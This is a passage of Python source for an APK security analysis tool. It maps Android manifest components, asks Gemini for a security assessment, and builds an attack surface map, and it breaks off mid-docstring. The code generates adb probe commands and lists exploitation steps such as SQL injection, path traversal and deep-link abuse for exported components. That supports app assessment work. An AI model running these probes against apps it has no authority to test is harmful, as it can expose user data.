    return results


# ============================================================================
# Manifest Visualization Functions
# ============================================================================

def generate_manifest_visualization(apk_path: Path) -> ManifestVisualization:
    """
    Generate visualization data for an APK's AndroidManifest.
    
    Args:
        apk_path: Path to the APK file
    
    Returns:
        ManifestVisualization with nodes, edges, and mermaid diagram
    """
    try:
        from androguard.core.apk import APK
        apk = APK(str(apk_path))
    except Exception as e:
        logger.error(f"Failed to parse APK for manifest visualization: {e}")
        return ManifestVisualization(
            package_name="unknown",
            app_name=None,
            version_name=None,
            nodes=[],
            edges=[],
            component_counts={},
            permission_summary={},
            exported_count=0,
            main_activity=None,
            deep_link_schemes=[],
            mermaid_diagram="flowchart LR\n  Error[Failed to parse APK]"
        )
    
    nodes = []
    edges = []
    package_name = apk.get_package() or "unknown"
    app_name = apk.get_app_name()
    version_name = apk.get_androidversion_name()
    
    # Component counts
    component_counts = {
        'activities': 0,
        'services': 0,
        'receivers': 0,
        'providers': 0,
        'permissions': 0
    }
    
    # Permission analysis
    permission_summary = {
        'dangerous': 0,
        'normal': 0,
        'signature': 0,
        'total': 0
    }
    
    deep_link_schemes = set()
    main_activity = None
    exported_count = 0
    
    # Add app node
    nodes.append(ManifestNode(
        id="app",
        name=package_name,
        node_type="application",
        label=app_name or package_name,
        attributes={'version': version_name}
    ))
    
    # Process activities
    for activity in apk.get_activities():
        activity_short = activity.split('.')[-1]
        is_exported = _is_component_exported(apk, activity, 'activity')
        is_main = _is_main_activity(apk, activity)
        
        if is_main:
            main_activity = activity
        if is_exported:
            exported_count += 1
        
        node = ManifestNode(
            id=f"act_{activity_short}",
            name=activity,
            node_type="activity",
            label=activity_short,
            is_exported=is_exported,
            is_main=is_main,
            attributes=_get_component_attributes(apk, activity, 'activity')
        )
        nodes.append(node)
        component_counts['activities'] += 1
        
        # Edge from app to activity
        edges.append(ManifestEdge(
            source="app",
            target=f"act_{activity_short}",
            edge_type="contains",
            label="activity"
        ))
        
        # Process intent filters for deep links
        try:
            intent_filters = apk.get_intent_filters('activity', activity)
            if intent_filters and isinstance(intent_filters, dict):
                # androguard returns dict with 'action', 'category', 'data' keys
                data_list = intent_filters.get('data', [])
                if isinstance(data_list, list):
                    for data in data_list:
                        if isinstance(data, dict):
                            scheme = data.get('scheme', '')
                            if scheme and scheme not in ('http', 'https'):
                                deep_link_schemes.add(scheme)
                        elif isinstance(data, str):
                            # Handle if data is a simple string
                            if data and data not in ('http', 'https'):
                                deep_link_schemes.add(data)
        except Exception as e:
            logger.debug(f"Could not process intent filters for {activity}: {e}")
    
    # Process services
    for service in apk.get_services():
        service_short = service.split('.')[-1]
        is_exported = _is_component_exported(apk, service, 'service')
        
        if is_exported:
            exported_count += 1
        
        node = ManifestNode(
            id=f"svc_{service_short}",
            name=service,
            node_type="service",
            label=service_short,
            is_exported=is_exported,
            attributes=_get_component_attributes(apk, service, 'service')
        )
        nodes.append(node)
        component_counts['services'] += 1
        
        edges.append(ManifestEdge(
            source="app",
            target=f"svc_{service_short}",
            edge_type="contains",
            label="service"
        ))
    
    # Process receivers
    for receiver in apk.get_receivers():
        receiver_short = receiver.split('.')[-1]
        is_exported = _is_component_exported(apk, receiver, 'receiver')
        
        if is_exported:
            exported_count += 1
        
        node = ManifestNode(
            id=f"rcv_{receiver_short}",
            name=receiver,
            node_type="receiver",
            label=receiver_short,
            is_exported=is_exported,
            attributes=_get_component_attributes(apk, receiver, 'receiver')
        )
        nodes.append(node)
        component_counts['receivers'] += 1
        
        edges.append(ManifestEdge(
            source="app",
            target=f"rcv_{receiver_short}",
            edge_type="contains",
            label="receiver"
        ))
    
    # Process providers
    for provider in apk.get_providers():
        provider_short = provider.split('.')[-1]
        is_exported = _is_component_exported(apk, provider, 'provider')
        
        if is_exported:
            exported_count += 1
        
        node = ManifestNode(
            id=f"prv_{provider_short}",
            name=provider,
            node_type="provider",
            label=provider_short,
            is_exported=is_exported,
            is_dangerous=is_exported,  # Exported providers are dangerous
            attributes=_get_component_attributes(apk, provider, 'provider')
        )
        nodes.append(node)
        component_counts['providers'] += 1
        
        edges.append(ManifestEdge(
            source="app",
            target=f"prv_{provider_short}",
            edge_type="contains",
            label="provider"
        ))
    
    # Process permissions
    for permission in apk.get_permissions():
        perm_short = permission.split('.')[-1]
        is_dangerous = permission in DANGEROUS_PERMISSIONS
        
        if is_dangerous:
            permission_summary['dangerous'] += 1
        else:
            permission_summary['normal'] += 1
        permission_summary['total'] += 1
        
        node = ManifestNode(
            id=f"perm_{perm_short}",
            name=permission,
            node_type="permission",
            label=perm_short,
            is_dangerous=is_dangerous
        )
        nodes.append(node)
        component_counts['permissions'] += 1
        
        edges.append(ManifestEdge(
            source="app",
            target=f"perm_{perm_short}",
            edge_type="uses_permission",
            label=""
        ))
    
    # Generate mermaid diagram
    mermaid_diagram = _generate_manifest_mermaid(
        package_name, nodes, edges, main_activity, exported_count
    )
    
    return ManifestVisualization(
        package_name=package_name,
        app_name=app_name,
        version_name=version_name,
        nodes=nodes,
        edges=edges,
        component_counts=component_counts,
        permission_summary=permission_summary,
        exported_count=exported_count,
        main_activity=main_activity,
        deep_link_schemes=list(deep_link_schemes),
        mermaid_diagram=mermaid_diagram
    )


def _is_component_exported(apk, component_name: str, component_type: str) -> bool:
    """Check if a component is exported."""
    try:
        # Get android:exported attribute
        manifest = apk.get_android_manifest_xml()
        if manifest is None:
            return False
        
        # Simple check - if it has intent filters, it's typically exported
        intent_filters = apk.get_intent_filters(component_type, component_name)
        if intent_filters:
            return True
        
        return False
    except Exception:
        return False


def _is_main_activity(apk, activity_name: str) -> bool:
    """Check if an activity is the main launcher activity."""
    try:
        main = apk.get_main_activity()
        return main == activity_name
    except Exception:
        return False


def _get_component_attributes(apk, component_name: str, component_type: str) -> Dict[str, Any]:
    """Get additional attributes for a component."""
    attrs = {}
    try:
        intent_filters = apk.get_intent_filters(component_type, component_name)
        if intent_filters:
            # androguard returns a dict with 'action', 'category', 'data' keys
            if isinstance(intent_filters, dict):
                attrs['intent_filters'] = 1
                actions = intent_filters.get('action', [])
                if isinstance(actions, list):
                    attrs['actions'] = actions
                else:
                    attrs['actions'] = [str(actions)] if actions else []
            elif isinstance(intent_filters, list):
                attrs['intent_filters'] = len(intent_filters)
                attrs['actions'] = []
                for f in intent_filters:
                    if isinstance(f, dict):
                        attrs['actions'].extend(f.get('action', []))
                    elif isinstance(f, str):
                        attrs['actions'].append(f)
            else:
                attrs['intent_filters'] = 1
                attrs['actions'] = []
    except Exception:
        pass
    return attrs


def _generate_manifest_mermaid(
    package_name: str,
    nodes: List[ManifestNode],
    edges: List[ManifestEdge],
    main_activity: Optional[str],
    exported_count: int
) -> str:
    """Generate a Mermaid flowchart for the manifest with iconify icons."""
    lines = ["flowchart TB"]
    lines.append(f"    subgraph APP[\"fa6-brands:android {package_name}\"]")
    lines.append("    direction TB")
    
    # Group nodes by type
    activities = [n for n in nodes if n.node_type == "activity"]
    services = [n for n in nodes if n.node_type == "service"]
    receivers = [n for n in nodes if n.node_type == "receiver"]
    providers = [n for n in nodes if n.node_type == "provider"]
    permissions = [n for n in nodes if n.node_type == "permission"]
    
    # Activities subgraph
    if activities:
        lines.append("    subgraph Activities[\"mdi:application Activities\"]")
        for node in activities[:10]:  # Limit to avoid huge diagrams
            style = ":::exported" if node.is_exported else ""
            icon = "mdi:rocket-launch" if node.is_main else "mdi:application"
            lines.append(f"        {node.id}[{icon} {node.label}]{style}")
        if len(activities) > 10:
            lines.append(f"        act_more[mdi:dots-horizontal +{len(activities) - 10} more]")
        lines.append("    end")
    
    # Services subgraph
    if services:
        lines.append("    subgraph Services[\"mdi:cog Services\"]")
        for node in services[:5]:
            style = ":::exported" if node.is_exported else ""
            lines.append(f"        {node.id}[mdi:cog {node.label}]{style}")
        if len(services) > 5:
            lines.append(f"        svc_more[mdi:dots-horizontal +{len(services) - 5} more]")
        lines.append("    end")
    
    # Receivers subgraph
    if receivers:
        lines.append("    subgraph Receivers[\"mdi:broadcast Receivers\"]")
        for node in receivers[:5]:
            style = ":::exported" if node.is_exported else ""
            lines.append(f"        {node.id}[mdi:broadcast {node.label}]{style}")
        if len(receivers) > 5:
            lines.append(f"        rcv_more[mdi:dots-horizontal +{len(receivers) - 5} more]")
        lines.append("    end")
    
    # Providers subgraph
    if providers:
        lines.append("    subgraph Providers[\"mdi:database Providers\"]")
        for node in providers[:5]:
            style = ":::danger" if node.is_exported else ""
            lines.append(f"        {node.id}[mdi:database {node.label}]{style}")
        lines.append("    end")
    
    lines.append("    end")  # Close APP subgraph
    
    # Dangerous permissions outside
    dangerous_perms = [n for n in permissions if n.is_dangerous]
    if dangerous_perms:
        lines.append("    subgraph DangerousPermissions[\"fa6-solid:triangle-exclamation Dangerous Permissions\"]")
        for node in dangerous_perms[:8]:
            lines.append(f"        {node.id}[fa6-solid:unlock {node.label}]:::danger")
        if len(dangerous_perms) > 8:
            lines.append(f"        perm_more[mdi:dots-horizontal +{len(dangerous_perms) - 8} more]")
        lines.append("    end")
        lines.append("    APP --> DangerousPermissions")
    
    # Styles
    lines.append("    classDef exported fill:#ff9800,stroke:#e65100,color:#000")
    lines.append("    classDef danger fill:#f44336,stroke:#b71c1c,color:#fff")
    
    return "\n".join(lines)


async def generate_ai_enhanced_manifest_visualization(
    apk_path: Path,
    output_dir: Optional[Path] = None
) -> ManifestVisualization:
    """
    Generate an AI-ENHANCED manifest visualization with deep component analysis.
    
    This goes beyond static manifest parsing to:
    1. Analyze component source code to understand actual purpose
    2. Identify security-relevant intent filter patterns
    3. Map component relationships and data flows
    4. Provide security assessment of the manifest configuration
    
    Args:
        apk_path: Path to the APK file
        output_dir: Optional JADX output directory for source code analysis
    
    Returns:
        ManifestVisualization with AI-enhanced analysis fields populated
    """
    # Start with standard manifest visualization
    base_result = generate_manifest_visualization(apk_path)
    
    if not settings.gemini_api_key:
        return base_result
    
    try:
        from google import genai
        from google.genai import types
        from androguard.core.apk import APK
        
        client = genai.Client(api_key=settings.gemini_api_key)
        apk = APK(str(apk_path))
        
        # Collect source code for components if available
        component_code_context = ""
        if output_dir and Path(output_dir).exists():
            sources_dir = Path(output_dir) / "sources"
            if sources_dir.exists():
                component_code_context = _collect_component_source_code(
                    sources_dir, 
                    base_result.nodes,
                    max_components=25
                )
        
        # Build comprehensive manifest context
        manifest_context = f"""
=== APK MANIFEST ANALYSIS ===
Package: {base_result.package_name}
App Name: {base_result.app_name or 'Unknown'}
Version: {base_result.version_name}

=== COMPONENTS ===
Activities ({base_result.component_counts.get('activities', 0)}):
"""
        for node in [n for n in base_result.nodes if n.node_type == 'activity'][:20]:
            exported = "[EXPORTED]" if node.is_exported else ""
            main = "[MAIN LAUNCHER]" if node.is_main else ""
            actions = node.attributes.get('actions', [])
            actions_str = f" - Actions: {', '.join(actions[:3])}" if actions else ""
            manifest_context += f"  - {node.name} {exported}{main}{actions_str}\n"
        
        manifest_context += f"\nServices ({base_result.component_counts.get('services', 0)}):\n"
        for node in [n for n in base_result.nodes if n.node_type == 'service'][:15]:
            exported = "[EXPORTED]" if node.is_exported else ""
            manifest_context += f"  - {node.name} {exported}\n"
        
        manifest_context += f"\nBroadcast Receivers ({base_result.component_counts.get('receivers', 0)}):\n"
        for node in [n for n in base_result.nodes if n.node_type == 'receiver'][:15]:
            exported = "[EXPORTED]" if node.is_exported else ""
            actions = node.attributes.get('actions', [])
            actions_str = f" - Listens: {', '.join(actions[:2])}" if actions else ""
            manifest_context += f"  - {node.name} {exported}{actions_str}\n"
        
        manifest_context += f"\nContent Providers ({base_result.component_counts.get('providers', 0)}):\n"
        for node in [n for n in base_result.nodes if n.node_type == 'provider'][:10]:
            exported = "[EXPORTED - DANGEROUS]" if node.is_exported else ""
            manifest_context += f"  - {node.name} {exported}\n"
        
        # Permissions
        dangerous_perms = [n for n in base_result.nodes if n.node_type == 'permission' and n.is_dangerous]
        manifest_context += f"\n=== PERMISSIONS ===\nTotal: {base_result.permission_summary.get('total', 0)}\nDangerous: {base_result.permission_summary.get('dangerous', 0)}\n"
        if dangerous_perms:
            manifest_context += "Dangerous Permission List:\n"
            for p in dangerous_perms[:15]:
                manifest_context += f"  - {p.name}\n"
        
        # Deep links
        if base_result.deep_link_schemes:
            manifest_context += f"\n=== DEEP LINKS ===\nSchemes: {', '.join(base_result.deep_link_schemes)}\n"
        
        # Add source code context
        if component_code_context:
            manifest_context += f"\n=== COMPONENT SOURCE CODE ===\n{component_code_context}"
        
        # AI Analysis prompt
        prompt = f"""You are an expert Android security analyst. Analyze this app's manifest structure and provide a COMPREHENSIVE assessment.

{manifest_context}

Provide your analysis in the following JSON format (respond with ONLY valid JSON):

{{
  "app_overview": "2-3 sentences describing what this app appears to be based on its components and permissions",
  "component_purposes": {{
    "ComponentName1": "Brief description of what this component does based on its name, intent filters, and code if available",
    "ComponentName2": "..."
  }},
  "intent_filter_analysis": {{
    "deep_link_handlers": ["List of components handling custom URL schemes"],
    "broadcast_listeners": {{"BOOT_COMPLETED": ["receivers"], "PACKAGE_INSTALLED": ["receivers"]}},
    "implicit_intents": ["Components accepting implicit intents from other apps"],
    "share_handlers": ["Components that handle ACTION_SEND/SHARE"],
    "file_handlers": ["Components that handle file opening"]
  }},
  "security_assessment": {{
    "risk_level": "LOW/MEDIUM/HIGH/CRITICAL",
    "risk_score": 0-100,
    "findings": [
      {{
        "severity": "critical/high/medium/low",
        "title": "Finding title",
        "description": "Detailed description",
        "affected_component": "Component name",
        "recommendation": "How to fix"
      }}
    ],
    "exported_component_risks": "Assessment of exported component exposure",
    "permission_concerns": "Assessment of dangerous permissions",
    "data_exposure_risk": "Assessment of content provider exposure"
  }},
  "component_relationships": {{
    "entry_points": ["Main entry point components"],
    "background_workers": ["Services that run in background"],
    "data_managers": ["Components that handle data storage"],
    "network_handlers": ["Components likely handling network operations"]
  }},
  "attack_surface_summary": "Brief summary of the manifest-level attack surface"
}}

Be thorough and accurate. Only include information you can verify from the manifest data and source code provided."""

        # Use retry helper for reliability
        response = await gemini_request_with_retry(
            lambda: client.aio.models.generate_content(
                model=settings.gemini_model_id,
                contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
            ),
            max_retries=3,
            base_delay=2.0,
            timeout_seconds=180.0,
            operation_name="Manifest AI analysis"
        )
        
        if response is None:
            logger.warning("Manifest AI analysis failed after retries")
            return base_result
        
        if response.text:
            # Parse AI response
            import json
            try:
                ai_response = response.text.strip()
                if ai_response.startswith("```json"):
                    ai_response = ai_response[7:]
                if ai_response.startswith("```"):
                    ai_response = ai_response[3:]
                if ai_response.endswith("```"):
                    ai_response = ai_response[:-3]
                
                ai_data = json.loads(ai_response.strip())
                
                # Update result with AI analysis
                base_result.ai_analysis = ai_data.get('app_overview', '')
                base_result.component_purposes = ai_data.get('component_purposes', {})
                base_result.security_assessment = json.dumps(ai_data.get('security_assessment', {}))
                base_result.intent_filter_analysis = ai_data.get('intent_filter_analysis', {})
                
            except json.JSONDecodeError:
                # Fall back to raw text
                base_result.ai_analysis = response.text[:2000]
        
        return base_result
        
    except Exception as e:
        logger.error(f"AI manifest analysis failed: {e}")
        return base_result


def _collect_component_source_code(
    sources_dir: Path,
    nodes: List[ManifestNode],
    max_components: int = 25
) -> str:
    """Collect source code for manifest components."""
    code_context = ""
    collected = 0
    
    # Priority: Activities > Services > Receivers > Providers
    priority_order = ['activity', 'service', 'receiver', 'provider']
    
    for component_type in priority_order:
        for node in [n for n in nodes if n.node_type == component_type]:
            if collected >= max_components:
                break
            
            # Find the source file
            class_name = node.name.split('.')[-1]
            
            for java_file in sources_dir.rglob(f'{class_name}.java'):
                try:
                    code = java_file.read_text(encoding='utf-8', errors='ignore')[:5000]
                    code_context += f"""
--- {node.name} ({component_type}) ---
{code}

"""
                    collected += 1
                    break
                except:
                    pass
    
    return code_context


# ============================================================================
# Attack Surface Map Functions
# ============================================================================

def generate_attack_surface_map(apk_path: Path) -> AttackSurfaceMap:
    """
    Generate a comprehensive attack surface map for an APK.
    
    Args:
        apk_path: Path to the APK file
    
    Returns:
        AttackSurfaceMap with attack vectors, deep links, and automated tests
    """
    try:
        from androguard.core.apk import APK
        apk = APK(str(apk_path))
    except Exception as e:
        logger.error(f"Failed to parse APK for attack surface: {e}")
        return AttackSurfaceMap(
            package_name="unknown",
            total_attack_vectors=0,
            attack_vectors=[],
            exposed_data_paths=[],
            deep_links=[],
            ipc_endpoints=[],
            overall_exposure_score=0,
            risk_level="unknown",
            risk_breakdown={},
            priority_targets=[],
            automated_tests=[],
            mermaid_attack_tree="flowchart TD\n  Error[Failed to parse APK]"
        )
    
    package_name = apk.get_package() or "unknown"
    attack_vectors = []
    exposed_data_paths = []
    deep_links = []
    ipc_endpoints = []
    automated_tests = []
    
    risk_breakdown = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
    
    # Analyze exported activities
    for activity in apk.get_activities():
        is_exported = _is_component_exported(apk, activity, 'activity')
        if is_exported:
            vector = _create_activity_attack_vector(apk, activity, package_name)
            attack_vectors.append(vector)
            risk_breakdown[vector.severity] = risk_breakdown.get(vector.severity, 0) + 1
            
            # Add automated test
            automated_tests.append({
                'name': f'Launch {activity.split(".")[-1]}',
                'command': f'adb shell am start -n {package_name}/{activity}',
                'description': 'Attempt to launch exported activity'
            })
    
    # Analyze exported services
    for service in apk.get_services():
        is_exported = _is_component_exported(apk, service, 'service')
        if is_exported:
            vector = _create_service_attack_vector(apk, service, package_name)
            attack_vectors.append(vector)
            risk_breakdown[vector.severity] = risk_breakdown.get(vector.severity, 0) + 1
            
            automated_tests.append({
                'name': f'Start {service.split(".")[-1]}',
                'command': f'adb shell am startservice -n {package_name}/{service}',
                'description': 'Attempt to start exported service'
            })
    
    # Analyze exported receivers
    for receiver in apk.get_receivers():
        is_exported = _is_component_exported(apk, receiver, 'receiver')
        if is_exported:
            vector = _create_receiver_attack_vector(apk, receiver, package_name)
            attack_vectors.append(vector)
            risk_breakdown[vector.severity] = risk_breakdown.get(vector.severity, 0) + 1
            
            # Get intent actions for receiver
            actions = []
            try:
                intent_filters = apk.get_intent_filters('receiver', receiver)
                if isinstance(intent_filters, dict):
                    action_list = intent_filters.get('action', [])
                    if isinstance(action_list, list):
                        actions.extend(action_list)
                elif isinstance(intent_filters, list):
                    for intent_filter in intent_filters:
                        if isinstance(intent_filter, dict):
                            actions.extend(intent_filter.get('action', []))
            except Exception:
                pass
            
            if actions:
                automated_tests.append({
                    'name': f'Broadcast to {receiver.split(".")[-1]}',
                    'command': f'adb shell am broadcast -a {actions[0]} -n {package_name}/{receiver}',
                    'description': 'Send broadcast to exported receiver'
                })
    
    # Analyze content providers
    for provider in apk.get_providers():
        is_exported = _is_component_exported(apk, provider, 'provider')
        if is_exported:
            vector = _create_provider_attack_vector(apk, provider, package_name)
            attack_vectors.append(vector)
            risk_breakdown['high'] += 1
            
            # Create exposed data path
            data_path = _create_exposed_data_path(apk, provider)
            if data_path:
                exposed_data_paths.append(data_path)
            
            automated_tests.append({
                'name': f'Query {provider.split(".")[-1]}',
                'command': f'adb shell content query --uri content://{package_name}.provider',
                'description': 'Attempt to query exported content provider'
            })
    
    # Analyze deep links
    deep_links = _extract_deep_links(apk, package_name)
    for deep_link in deep_links:
        vector = AttackVector(
            id=f"deeplink_{len(attack_vectors)}",
            name=f"Deep Link: {deep_link.scheme}://{deep_link.host}",
            vector_type="deep_link",
            component=deep_link.handling_activity,
            severity="medium",
            description=f"Custom URL scheme {deep_link.scheme}:// can be invoked from other apps or web pages",
            exploitation_steps=[
                f"Create HTML page with link: <a href=\"{deep_link.full_url}\">Click</a>",
                "Or use intent: Intent.parseUri() with the deep link URL",
                "Test parameter injection in path/query parameters"
            ],
            required_permissions=[],
            adb_command=f'adb shell am start -W -a android.intent.action.VIEW -d "{deep_link.full_url}"',
            intent_example=f'new Intent(Intent.ACTION_VIEW, Uri.parse("{deep_link.full_url}"))',
            mitigation="Validate all deep link parameters, use App Links with verification"
        )
        attack_vectors.append(vector)
        risk_breakdown['medium'] += 1
        
        automated_tests.append({
            'name': f'Open deep link {deep_link.scheme}://',
            'command': f'adb shell am start -W -a android.intent.action.VIEW -d "{deep_link.full_url}"',
            'description': f'Open deep link to {deep_link.handling_activity}'
        })
    
    # Calculate overall exposure score
    total_vectors = len(attack_vectors)
    exposure_score = min(100, (
        risk_breakdown['critical'] * 25 +
        risk_breakdown['high'] * 15 +
        risk_breakdown['medium'] * 8 +
        risk_breakdown['low'] * 3
    ))
    
    # Determine risk level
    if exposure_score >= 70 or risk_breakdown['critical'] > 0:
        risk_level = "critical"
    elif exposure_score >= 50 or risk_breakdown['high'] >= 3:
        risk_level = "high"
    elif exposure_score >= 25 or risk_breakdown['medium'] >= 3:
        risk_level = "medium"
    else:
        risk_level = "low"
    
    # Priority targets
    priority_targets = []
    for vector in sorted(attack_vectors, key=lambda v: {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}.get(v.severity, 4)):
        if len(priority_targets) >= 5:
            break
        priority_targets.append(f"[{vector.severity.upper()}] {vector.name}")
    
    # Generate mermaid attack tree
    mermaid_attack_tree = _generate_attack_tree_mermaid(
        package_name, attack_vectors, deep_links, exposed_data_paths
    )
    
    return AttackSurfaceMap(
        package_name=package_name,
        total_attack_vectors=total_vectors,
        attack_vectors=attack_vectors,
        exposed_data_paths=exposed_data_paths,
        deep_links=deep_links,
        ipc_endpoints=ipc_endpoints,
        overall_exposure_score=exposure_score,
        risk_level=risk_level,
        risk_breakdown=risk_breakdown,
        priority_targets=priority_targets,
        automated_tests=automated_tests,
        mermaid_attack_tree=mermaid_attack_tree
    )


def _create_activity_attack_vector(apk, activity: str, package: str) -> AttackVector:
    """Create an attack vector for an exported activity."""
    activity_short = activity.split('.')[-1]
    
    # Check for sensitive activity names
    severity = "medium"
    if any(kw in activity.lower() for kw in ('login', 'auth', 'password', 'settings', 'admin', 'debug', 'internal')):
        severity = "high"
    if any(kw in activity.lower() for kw in ('webview', 'browser', 'url')):
        severity = "high"  # Potential URL injection
    
    return AttackVector(
        id=f"activity_{activity_short}",
        name=f"Exported Activity: {activity_short}",
        vector_type="exported_activity",
        component=activity,
        severity=severity,
        description=f"Activity {activity_short} is exported and can be launched by other apps",
        exploitation_steps=[
            "Launch activity directly using adb or Intent",
            "Check for sensitive functionality accessible without authentication",
            "Test intent extra parameters for injection",
            "Look for data returned in onActivityResult"
        ],
        required_permissions=[],
        adb_command=f'adb shell am start -n {package}/{activity}',
        intent_example=f'Intent intent = new Intent(); intent.setComponent(new ComponentName("{package}", "{activity}"));',
        mitigation="Remove android:exported=true if not needed, or add permission requirements"
    )


def _create_service_attack_vector(apk, service: str, package: str) -> AttackVector:
    """Create an attack vector for an exported service."""
    service_short = service.split('.')[-1]
    
    severity = "high"  # Services are generally higher risk
    if any(kw in service.lower() for kw in ('sync', 'background', 'job')):
        severity = "medium"
    
    return AttackVector(
        id=f"service_{service_short}",
        name=f"Exported Service: {service_short}",
        vector_type="exported_service",
        component=service,
        severity=severity,
        description=f"Service {service_short} is exported and can be started/bound by other apps",
        exploitation_steps=[
            "Start service with malicious intent data",
            "Bind to service and call exposed methods",
            "Analyze AIDL interface if available",
            "Check for sensitive operations performed by service"
        ],
        required_permissions=[],
        adb_command=f'adb shell am startservice -n {package}/{service}',
        intent_example=f'Intent intent = new Intent(); intent.setComponent(new ComponentName("{package}", "{service}"));',
        mitigation="Set android:exported=false or add signature-level permission requirement"
    )


def _create_receiver_attack_vector(apk, receiver: str, package: str) -> AttackVector:
    """Create an attack vector for an exported broadcast receiver."""
    receiver_short = receiver.split('.')[-1]
    
    # Get actions
    actions = []
    try:
        intent_filters = apk.get_intent_filters('receiver', receiver)
        if isinstance(intent_filters, dict):
            action_list = intent_filters.get('action', [])
            if isinstance(action_list, list):
                actions.extend(action_list)
        elif isinstance(intent_filters, list):
            for intent_filter in intent_filters:
                if isinstance(intent_filter, dict):
                    actions.extend(intent_filter.get('action', []))
    except Exception:
        pass
    
    severity = "medium"
    if any(kw in receiver.lower() for kw in ('sms', 'push', 'notification', 'message')):
        severity = "high"
    
    return AttackVector(
        id=f"receiver_{receiver_short}",
        name=f"Exported Receiver: {receiver_short}",
        vector_type="exported_receiver",
        component=receiver,
        severity=severity,
        description=f"Broadcast receiver {receiver_short} is exported and can receive broadcasts from other apps",
        exploitation_steps=[
            "Send broadcast with malicious intent data",
            "Test registered actions: " + ", ".join(actions[:3]) if actions else "Check for registered actions",
            "Look for command injection in extras",
            "Check for sensitive operations triggered by broadcast"
        ],
        required_permissions=[],
        adb_command=f'adb shell am broadcast -n {package}/{receiver}' + (f' -a {actions[0]}' if actions else ''),
        intent_example=f'sendBroadcast(new Intent("{actions[0] if actions else "ACTION"}").setComponent(new ComponentName("{package}", "{receiver}")));',
        mitigation="Use LocalBroadcastManager for internal broadcasts, add permission requirements"
    )


def _create_provider_attack_vector(apk, provider: str, package: str) -> AttackVector:
    """Create an attack vector for an exported content provider."""
    provider_short = provider.split('.')[-1]
    
    return AttackVector(
        id=f"provider_{provider_short}",
        name=f"Exported Provider: {provider_short}",
        vector_type="exported_provider",
        component=provider,
        severity="high",  # Providers are high risk due to data access
        description=f"Content provider {provider_short} is exported and may expose sensitive data",
        exploitation_steps=[
            "Query provider for data: content://authority/table",
            "Test SQL injection in selection parameters",
            "Check for path traversal in URI paths",
            "Look for sensitive data (user info, tokens, etc.)"
        ],
        required_permissions=[],
        adb_command=f'adb shell content query --uri content://{package}',
        intent_example=f'getContentResolver().query(Uri.parse("content://{package}/data"), null, null, null, null);',
        mitigation="Set android:exported=false, implement proper permission checks, sanitize queries"
    )


def _create_exposed_data_path(apk, provider: str) -> Optional[ExposedDataPath]:
    """Create an exposed data path entry for a content provider."""
    return ExposedDataPath(
        provider_name=provider,
        uri_pattern=f"content://{provider.split('.')[-1].lower()}/*",
        permissions_required=[],
        operations=["query", "insert", "update", "delete"],
        is_exported=True,
        potential_data="Database rows, files, or app-specific data",
        risk_level="high"
    )


def _extract_deep_links(apk, package: str) -> List[DeepLinkEntry]:
    """Extract all deep links from the APK."""
    deep_links = []
    
    for activity in apk.get_activities():
        try:
            intent_filters = apk.get_intent_filters('activity', activity)
            
            # Handle dict format (single filter) or list format (multiple filters)
            if isinstance(intent_filters, dict):
                # Process single intent filter dict
                actions = intent_filters.get('action', [])
                categories = intent_filters.get('category', [])
                
                if not isinstance(actions, list):
                    actions = [actions] if actions else []
                if not isinstance(categories, list):
                    categories = [categories] if categories else []
                
                # Check for VIEW action with BROWSABLE category
                is_browsable = 'android.intent.action.VIEW' in actions and \
                               'android.intent.category.BROWSABLE' in categories
                
                data_list = intent_filters.get('data', [])
                if not isinstance(data_list, list):
                    data_list = [data_list] if data_list else []
                
                for data in data_list:
                    if isinstance(data, dict):
                        scheme = data.get('scheme', '')
                        host = data.get('host', '')
                        path = data.get('path', data.get('pathPrefix', data.get('pathPattern', '')))
                        
                        if scheme:
                            # Build full URL
                            full_url = f"{scheme}://"
                            if host:
                                full_url += host
                            if path:
                                full_url += path
                            
                            deep_links.append(DeepLinkEntry(
                                scheme=scheme,
                                host=host or "*",
                                path=path or "/",
                                full_url=full_url,
                                handling_activity=activity,
                                parameters=[],
                                is_verified=scheme in ('http', 'https'),  # App Links
                                security_notes=_get_deep_link_security_notes(scheme, host, is_browsable)
                            ))
                    elif isinstance(data, str) and data:
                        # Simple scheme string
                        deep_links.append(DeepLinkEntry(
                            scheme=data,
                            host="*",
                            path="/",
                            full_url=f"{data}://",
                            handling_activity=activity,
                            parameters=[],
                            is_verified=False,
                            security_notes=[]
                        ))
            elif isinstance(intent_filters, list):
                # Process list of intent filters
                for intent_filter in intent_filters:
                    if not isinstance(intent_filter, dict):
                        continue
                    
                    actions = intent_filter.get('action', [])
                    categories = intent_filter.get('category', [])
                    
                    if not isinstance(actions, list):
                        actions = [actions] if actions else []
                    if not isinstance(categories, list):
                        categories = [categories] if categories else []
                    
                    is_browsable = 'android.intent.action.VIEW' in actions and \
                                   'android.intent.category.BROWSABLE' in categories
                    
                    data_list = intent_filter.get('data', [])
                    if not isinstance(data_list, list):
                        data_list = [data_list] if data_list else []
                    
                    for data in data_list:
                        if isinstance(data, dict):
                            scheme = data.get('scheme', '')
                            host = data.get('host', '')
                            path = data.get('path', data.get('pathPrefix', data.get('pathPattern', '')))
                            
                            if scheme:
                                full_url = f"{scheme}://"
                                if host:
                                    full_url += host
                                if path:
                                    full_url += path
                                
                                deep_links.append(DeepLinkEntry(
                                    scheme=scheme,
                                    host=host or "*",
                                    path=path or "/",
                                    full_url=full_url,
                                    handling_activity=activity,
                                    parameters=[],
                                    is_verified=scheme in ('http', 'https'),
                                    security_notes=_get_deep_link_security_notes(scheme, host, is_browsable)
                                ))
        except Exception as e:
            logger.debug(f"Could not process intent filters for activity {activity}: {e}")
    
    return deep_links


def _get_deep_link_security_notes(scheme: str, host: str, is_browsable: bool) -> List[str]:
    """Get security notes for a deep link."""
    notes = []
    
    if scheme in ('http', 'https'):
        if not host:
            notes.append(" No host specified - handles all URLs with this scheme")
        notes.append("Consider implementing App Links verification")
    else:
        notes.append(f"Custom scheme '{scheme}' - any app can trigger this")
        if is_browsable:
            notes.append("BROWSABLE category - can be triggered from web pages")
    
    if not host or host == "*":
        notes.append(" Wildcard host - very broad attack surface")
    
    return notes


# ============================================================================
# AI-Powered Attack Surface Tree Generation
# ============================================================================

async def generate_ai_attack_tree_mermaid(
    attack_surface: AttackSurfaceMap,
    output_dir: Path,
    decompiled_findings: Optional[List[Dict]] = None
) -> str:
    """
    Generate an AI-powered attack surface tree diagram by analyzing decompiled source code.
    
    ENHANCED VERSION: Uses comprehensive source code analysis to find REAL vulnerabilities
    by examining more classes, with detailed security pattern matching.
    
    Unlike the static version, this uses Gemini to:
